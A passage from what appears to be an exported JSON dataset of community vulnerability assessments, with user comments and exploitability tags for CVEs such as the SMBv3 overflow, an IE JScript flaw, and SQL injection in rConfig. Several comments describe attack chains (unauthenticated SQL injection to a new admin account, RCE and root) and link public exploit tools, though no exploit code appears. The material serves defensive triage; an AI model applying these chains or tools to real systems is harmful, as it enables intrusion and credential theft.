      "topicId": "3946fbd1-08db-4cf4-a269-c80337f21947",
      "created": "2020-03-09T21:33:50.361739Z",
      "revisionDate": "2020-04-22T17:57:57.509695Z",
      "document": "I am the author of this vulnerability. This is a stored cross site scripting vulnerability. It could be paired with CVE-2020-5307 which is an unauthenticated SQL injection to obtain login credentials, then plant the stored XSS payload.\r\n\r\nBlog post: https://cinzinga.github.io/CVE-2020-5307-5308/",
      "score": 5,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "requires_interaction",
          "no_useful_data",
          "post_auth"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "7fc50da1-fc3f-4bba-b2e5-53f9b10545a2",
      "editorId": "13aad8d2-5dc7-4a9e-b296-1a6b5255e482",
      "topicId": "5f2611ef-5862-4fd2-b67e-a463b2ff2ce8",
      "created": "2020-03-09T21:38:25.248281Z",
      "revisionDate": "2020-04-22T17:57:54.147454Z",
      "document": "I am the founder of this exploit. While it is in a Hewlett-Packard product, it is a very obscure piece of software and was no longer actively maintained until this vulnerability was reported. The application is only vulnerable when the web server interface is running.",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "obscure_configuration"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "06141311-8c0b-4a91-a16b-25b15725b6b7",
      "editorId": "0f4e22fc-1c27-4cb1-8eb8-8de89621fb9a",
      "topicId": "29d18865-a4e1-4b04-9126-2168b85571ab",
      "created": "2020-03-09T22:49:41.626895Z",
      "revisionDate": "2020-11-22T02:15:43.296293Z",
      "document": "# Summary\r\nFirst published in a [Microsoft out of band advisory][1], this vulnerability was detected as exploited in the wild by [Google\u2019s Threat Analysis Group][2]. No further details were given in the advisory other than the fact that it's a vulnerability in the JScript interpreter. This reduced the attack surface to Internet Explorer and excluded Edge. Furthermore, the website had to force Internet Explorer's Compatibility Mode for IE8 or lower.\r\n\r\n# Exploitability\r\nThe exploit is a use-after-free vulnerability, giving the attacker remote code execution in the users context. The user has to load the weaponized website, so it requires getting the user navigate to a malicious page. Furthermore, in the default configuration, Internet Explorer would ask in a separate dialog to enable ActiveX content, requiring further user interaction.\r\n\r\nUnfortunately these hurdles can be lowered in a specialized attack by either attacking a often visited website, abusing configured whitelists (as is often the case for business applications) or targeted phishing attacks.\r\n\r\n# Pre patch situation\r\nThis vulnerability was hotly debated when it was first published, because there was no patch available yet and the [mitigation proposed by Microsoft was not satisfactory][3]. Disabling access to the `jscript.dll` would break many applications that internally relied on old JavaScript or JScript features. Most notably, [PAC][4] would not work anymore and client computers could lose internet access. All applications would have to be tested for `jscript.dll` usage and hope that they didn't break.\r\n\r\n# Post patch situation\r\nThe patch mitigated the exploit, so patching is advised. It is not known if similar attacks could still be found. The similarity to [CVE-2019-1429][5] and the fact that the [Project 0 Bug for CVE-2019-1429][6] could be used to verify access of the DLL could lead to believe that similar vulnerabilities could be found in the future.\r\n\r\n[1]: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0674\r\n[2]: https://www.blog.google/technology/safety-security/threat-analysis-group/\r\n[3]: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0674#ID0EUGAC\r\n[4]: https://en.wikipedia.org/wiki/Proxy_auto-config\r\n[5]: https://nvd.nist.gov/vuln/detail/CVE-2019-1429\r\n[6]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1947",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "requires_interaction",
          "difficult_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "41f7e14d-944e-475f-b2a6-896354bc3a02",
      "editorId": "070816c2-96a2-431d-9254-212d36afcea9",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-03-10T14:34:20.666504Z",
      "revisionDate": "2020-07-10T13:27:16.387212Z",
      "document": "the easiness of exploiting this vulnerability depends directly on the ability to get a working set of creds.\r\nthat means that if the organization has weak password policy, guessable passwords, leaked credentials or external interface that allows password spraying, obtaining such credentials will be easy for adversaries.",
      "score": 3,
      "metadata": {
        "tags": [
          "post_auth",
          "common_enterprise",
          "easy_to_develop",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "4a656091-a5b7-4d92-bf3f-98e14b6d42a3",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "38474044-13da-4165-a8d4-86867ca68d83",
      "created": "2020-03-10T14:48:24.516971Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This de-serialization exploit can be performed without authentication in many instances. Because it leads to a reverse shell, this is incredibly valuable to an attacker.\r\n\r\nThere are many tools that will perform this exploit but my favorite is: https://github.com/joaomatosf/jexboss\r\n\r\nDue to many legacy applications being internet facing with these vulnerabilities still present, this is an extremely valuable tool for an attacker to have in their arsenal.\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e3e47881-fdef-4c9a-94b5-142c3b2c78ea",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "d5179d87-2a4d-4212-998b-ad7c7469e731",
      "created": "2020-03-10T14:59:15.936811Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "The fact that Alpine is widely used makes this an easy way to escalate privileges. Most Enterprises also don't update their \"Golden\" containers that often. Privilege escalation on a host that is using containers is likely valuable as that host will likely have valuable information on it.",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "easy_to_develop",
          "common_enterprise",
          "high_privilege_access",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e176e5b9-2d2f-41ef-a532-bafccd0d1456",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "b358b251-7e9d-453e-8802-e59a3de72faa",
      "created": "2020-03-10T15:02:58.044367Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Because this is a kernel panic, it is only useful if your goal is to take the host offline. Because DOS attacks are less useful overall to an attacker than RCE, LFI, or anything useful really, these vulnerabilities are not useful to have in your toolkit.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "no_useful_data"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "be3e7db8-1ae7-49ad-8568-f188e1ce639e",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "69b21ddb-9b38-4151-8607-13f22b4d8630",
      "created": "2020-03-10T18:33:10.292404Z",
      "revisionDate": "2020-03-10T18:36:44.607315Z",
      "document": "AFAIK, it is common to enable full mitigations on the binary, with ASLR enabled on the system. While this doesn't mean much in and of itself, it could mean the vulnerability is difficult or \"impossible\" to exploit, depending on how the software is engineered or configured. A crash has already been proven.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f1ab2308-9084-4ae9-a4b9-c18b8482b078",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "86915de7-c5f7-483b-a324-df5b1929fbf6",
      "created": "2020-03-10T18:38:05.09596Z",
      "revisionDate": "2020-03-10T18:38:59.138758Z",
      "document": "I obtained a vulnerable installer and successfully tested RCE using mr_me's exploit.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "297af582-0c3d-4d3d-9409-7df1fc3ee120",
      "editorId": "c713810e-f837-4288-a803-ed74c6e146e7",
      "topicId": "e85583cb-111d-4d95-80e5-4cd53bb1f952",
      "created": "2020-03-10T21:16:16.48578Z",
      "revisionDate": "2020-07-20T20:14:08.069437Z",
      "document": "Without Microsoft Officially publishing this one, it's difficult to do much of any analysis. The description & early reports are that it's a wormable buffer overflow in SMBv3 Compression, which from what I can find is on by default in SMBv3.\r\n",
      "score": 5,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "pre_auth",
          "common_enterprise"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "918fd0dc-9501-4b29-9d2c-bcef6490c317",
      "editorId": "2e32f38d-bd27-42ec-9a3b-e7b58a5aa507",
      "topicId": "e85583cb-111d-4d95-80e5-4cd53bb1f952",
      "created": "2020-03-11T13:19:58.983956Z",
      "revisionDate": "2020-06-09T16:30:43.830958Z",
      "document": "# Summary\r\nSMBv3.11 has a buffer overflow vulnerability when compression is enabled (default value). Windows 10 and Server use SMBv3.11 and the service runs as SYSTEM. **Successful exploitation will result in remote code exection, with SYSTEM privileges. This is considered \"wormable\".** Microsoft did not release a patch in March 2020 Patch Tuesday. **Update 3/12/2020: Microsoft released an out of band patch**\r\n\r\n# Narrative\r\nMicrosoft pulled the patch for CVE-2020-0796 from March 2020 Patch Tuesday at the last minute and some information was leaked by Cisco Talos but then deleted from their post. A screenshot I took states: \"CVE-2020-0796 is a remote code execution vulnerability in Microsoft Server Message Block 3.0 (SMBv3). An attacker could exploit this bug by sending a specially crafted packet to the target SMBv3 server, which the victim needs to be connected to.\"\r\n\r\nMicrosoft then released an advisory with more information: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV200005\r\n\"Microsoft is aware of a remote code execution vulnerability in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests. An attacker who successfully exploited the vulnerability could gain the ability to execute code on the target SMB Server or SMB Client. To exploit the vulnerability against an SMB Server, an unauthenticated attacker could send a specially crafted packet to a targeted SMBv3 Server. To exploit the vulnerability against an SMB Client, an unauthenticated attacker would need to configure a malicious SMBv3 Server and convince a user to connect to it.\"\r\n\r\nCERT followed: https://www.kb.cert.org/vuls/id/872016/ \r\n\r\n# Impact\r\nThis issue affects both SMB client and server that have SMBv3 Compression enabled. Remote code execution is possible pre-authentication from the network. CVSSv3 of 10. SMB runs with SYSTEM privileges.\r\n\r\n# Affected Population\r\nImpacted systems must run SMB v3.11. Compression is enabled by default.\r\nWindows 10 Version 1903 for 32-bit Systems\t\t \r\nWindows 10 Version 1903 for ARM64-based Systems\t\t \r\nWindows 10 Version 1903 for x64-based Systems\t\t \t \r\nWindows 10 Version 1909 for 32-bit Systems\t\r\nWindows 10 Version 1909 for ARM64-based Systems\t\r\nWindows 10 Version 1909 for x64-based Systems\r\nWindows Server, version 1903 (Server Core installation)\t\r\nWindows Server, version 1909 (Server Core installation)\r\n\r\n# Identify Vulnerable Hosts\r\nMethod to identify if SMB v3.11 is running and therefore vulnerable, given no patch, is possible through nmap: https://gist.github.com/nikallass/40f3215e6294e94cde78ca60dbe07394\r\n\r\n# Workaround\r\nDisable SMBv3 compression via registry as specified in ADV200005.\r\nServer: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 1 -Force\r\nClient: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 0 -Force\r\n\r\n# Update 3/12/2020\r\nMicrosoft released an out of band patch: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796\r\n",
      "score": 15,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "difficult_to_develop",
          "common_enterprise",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "73c1cb2e-3b70-41ad-8646-269be9dcb9c1",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "4aa85548-dd42-418c-8d6f-32a8d6771a4f",
      "created": "2020-03-11T15:11:32.019291Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "despite the age of this vuln, we still find vulnerable Alfresco, therefore it's worth a quick assessment to me.\r\n\r\nhaving tried to exploit /proxy?endpoint i think there is no known way to execute a \"useful\" attack.\r\n\r\nendpoint parameter can be abused to only do GET, so to achieve a write against an internal endpoint you should first have to find something that accepts modification using GET. possible, but uncommon.\r\nHTML for the requested endpoint will be sent back to the attacker, and this could be a useful information, but mostly info disclosure. again depends on what's in internal network, still possible but uncommon to find really juicy stuff.\r\n\r\nplus, if my skills in reading java code are good enough, a quick code review in source code revealed that just http and https protocols are supported by calling Classe. no file:// or something can be used to achieve, say, LFI.\r\n\r\nstill useful to map internal network or dirty other servers' log, and to collect information, but this vuln has a quite limited value to me.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "no_useful_data"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "c698267d-7cc4-4f6b-b3cc-7f56281ba8ab",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "fb545fc9-a1eb-44c3-8cbc-91fd4811c31a",
      "created": "2020-03-12T15:39:55.808888Z",
      "revisionDate": "2020-06-04T19:04:05.832737Z",
      "document": "i love these type of vulnerabilities because they chain three findings normally considered low/medium to take over a full infrastructure.\r\n\r\nwe have:\r\n1) a web page that doesn't check user session ( commands.inc.php doesn't have the if (!$session->logged_in) check and therefore no auth required upon access )\r\n2) a trivial unescaped GET parameter used in a sql query in that page, therefore unauth sql injection\r\n3) plaintext storage by default, therefore profit\r\n\r\nrConfig has access to network devices, and of course credentials (both standard and privileged) are kept in her database.\r\nwhat makes this attack even more useful, is that by default rConfig doesn't encrypt data so this sql injection will grant an attacker the plaintext of every juicy information about network infrastructure monitored by this tool: ip, username, password, eventual privileged ones, full configuration.\r\n\r\nsince version 3.8.0 it's possible to encrypt just passwords: http://help.rconfig.com/settings/mainsettings\r\nso point 3) is partially solved. in this case, an attacker will try to read files using sql injection, if user has FILE grants, to decrypt passwords and get loot anyway.\r\n\r\nplus, the webapp uses PDO which supports stacked queries. public exploits (https://www.exploit-db.com/exploits/48261) abuses this to execute INSERT statement adding new administrator, giving the chance to have RCE by chaining this CVE to CVE-2019-19509 (RCE) and LPE to root with CVE-2019-19585.\r\n\r\nas a bonus, we could chain this sqli to CVE-2020-10221 to get RCE: even if strong password are enforced (classes/usersession.class.php line 338), users' passwords are hashed using md5. a bruteforce is not that easy but way easier than against passwords hashed using modern algorithm.",
      "score": 5,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cc8c3bcf-314d-4527-87c9-b1d442381e61",
      "editorId": "818c0e98-ce83-4c9d-86ba-07dd8ca55526",
      "topicId": "77ce3b54-22e1-45aa-89c0-8cb495618d6c",
      "created": "2020-03-12T16:40:45.242308Z",
      "revisionDate": "2020-05-18T20:15:57.056304Z",
      "document": "## Description\r\nThis module exploits a Preauth Server-Side Template Injection leads remote code execution vulnerability in PlaySMS Before Version 1.4.3. This issue is caused by Double processes a server-side template by Custom PHP Template system called 'TPL'.which is used in PlaySMS template engine location src/Playsms/Tpl.php:_compile(). When Attacker supply username with a malicious payload and submit. This malicious payload first processes by TPL and save the value in the current template after this value goes for the second process which result in code execution.\r\nThe TPL(https://github.com/antonraharja/tpl) template language is vulnerable to PHP code injection\r\n\r\n## Vulnerable Application \r\nAvailable at [Source Forge](https://sourceforge.net/projects/playsms/files/playsms/Version%201.4.2/playsms-1.4.2.tar.gz/download)\r\n\r\n## Metasploit Exploit (Written By Me)\r\nAvailable at [Github PR](https://github.com/rapid7/metasploit-framework/pull/13067)\r\n\r\n## Exploit Video PoC\r\nAvailable at [Youtube Video](https://www.youtube.com/watch?v=zu-bwoAtTrc)",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5412a1c8-9f5f-4d57-97bf-817b678a8815",
      "editorId": "070816c2-96a2-431d-9254-212d36afcea9",
      "topicId": "af37cd6e-8730-4aef-8679-0413b491a107",
      "created": "2020-03-12T17:28:48.712787Z",
      "revisionDate": "2020-06-10T13:30:31.553155Z",
      "document": "An elevation of privilege vulnerability exists when the Windows Background Intelligent Transfer Service (BITS) improperly handles symbolic links. An attacker who successfully exploited this vulnerability could overwrite a targeted file leading to an elevated status.\r\n\r\nTo exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system.\r\n\r\nThe security update addresses the vulnerability by correcting how Windows BITS handles symbolic links.\r\n\r\nTechnical details can be found: https://itm4n.github.io/cve-2020-0787-windows-bits-eop/",
      "score": 3,
      "metadata": {
        "tags": [
          "difficult_to_exploit",
          "high_privilege_access",
          "difficult_to_develop",
          "common_enterprise",
          "post_auth"
        ],
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "200740f7-2222-4f4b-baac-8a0e44f74edf",
      "editorId": "070816c2-96a2-431d-9254-212d36afcea9",
      "topicId": "4f7350ae-ef50-4c10-aa45-8f473f230f89",
      "created": "2020-03-13T09:49:41.352991Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "LibSSH isn't common as other SSH server softwares and vulnerability is pretty dates so finding this in the wild won't be a walk in the park.\r\nHaving said that, if adversaries will find this software installed with a vulnerable version, exploitation is extremely easy (multiple exploit exists in the internet) and usually will provided access from the external to the server while fully bypassing the authentication.\r\nfor example - https://github.com/xFreed0m/CVE-2018-10933",
      "score": 1,
      "metadata": {
        "tags": [
          "pre_auth",
          "obscure_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b820ed1a-f1e5-4968-be87-b968d18e6265",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "86915de7-c5f7-483b-a324-df5b1929fbf6",
      "created": "2020-03-13T21:41:00.784306Z",
      "revisionDate": "2021-06-02T22:53:50.62395Z",
